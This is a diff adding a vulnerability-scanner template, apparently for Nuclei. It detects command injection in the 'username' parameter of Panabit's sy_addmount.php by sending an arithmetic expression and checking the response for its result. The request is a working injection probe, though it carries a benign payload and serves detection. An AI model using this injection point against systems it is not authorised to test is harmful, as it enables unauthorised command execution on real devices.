@@ -1,0 +1,32 @@
+id: panabit-syaddmount-username-rce
+info:
+  name: Panabit sy_addmount Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for command execution vulnerability in Panabit sy_addmount
+    feature by injecting a payload that performs arithmetic operations and reflects
+    the result in the response.
+  reference:
+    - https://blog.csdn.net/weixin_51387754/article/details/121147617
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+  r2: "{{rand_int(800000000, 1000000000)}}"
+
+http:
+  - raw:
+      - |
+        GET /account/sy_addmount.php?username={{r1}}%20%2B%20{{r2}} HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(r1) + to_number(r2)}}"
+        part: body
